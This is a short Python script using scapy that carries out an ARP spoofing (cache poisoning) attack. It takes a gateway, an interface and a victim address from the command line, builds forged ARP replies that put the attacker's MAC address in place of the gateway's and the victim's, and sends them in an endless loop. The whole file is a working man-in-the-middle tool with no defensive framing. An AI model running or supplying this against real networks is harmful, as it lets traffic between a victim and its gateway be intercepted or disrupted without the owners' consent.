from scapy.all import *
import argparse
import threading 

threads = 10
src_ip = "192.168.88.130"


def full_packet(src_mac,dst_mac,gateway_ip,dst_ip):
	eth = Ether(src = src_mac,dst = dst_mac)
	arp = ARP(op="is-at",hwsrc=src_mac,hwdst=dst_mac,psrc=gateway_ip,pdst=dst_ip)
	pkt = eth/arp
	return pkt

def gateway_packet(src_mac,gateway_mac,dst_ip,gateway_ip):
	eth = Ether(src = src_mac,dst = gateway_mac)
	arp = ARP(op="is-at",hwsrc=src_mac,hwdst=gateway_mac,psrc=dst_ip,pdst=gateway_ip)
	pkt = eth/arp
	return pkt

def main():
	parser = argparse.ArgumentParser()
	parser.add_argument('-g','--gateway',dest="gateway",action="store")
	parser.add_argument('-i','--interface',dest="interface",action="store")
	parser.add_argument('-f','--full',dest='full',action="store")
	args = parser.parse_args()
	gateway_ip = args.gateway
	gateway_mac = getmacbyip(gateway_ip)
	dst_ip = args.full
	dst_mac = getmacbyip(dst_ip)
	interface = args.interface
	src_mac = get_if_hwaddr(interface)
	
	pkt_dst = full_packet(src_mac,dst_mac,gateway_ip,dst_ip)
	pkt_gateway = gateway_packet(src_mac,gateway_mac,dst_ip,gateway_ip)
	while True:
		t = threading.Thread(target=sendp,args=(pkt_dst,),kwargs={'inter':1,'iface':interface})
		t.start()
		t.join()
		print "[*]send a full packet"
		s = threading.Thread(target=sendp,args=(pkt_gateway,),kwargs={'inter':1,'iface':interface})
		s.start()
		s.join()
		print "[*]send a gateway packet"

		

if __name__ == "__main__":
	main()
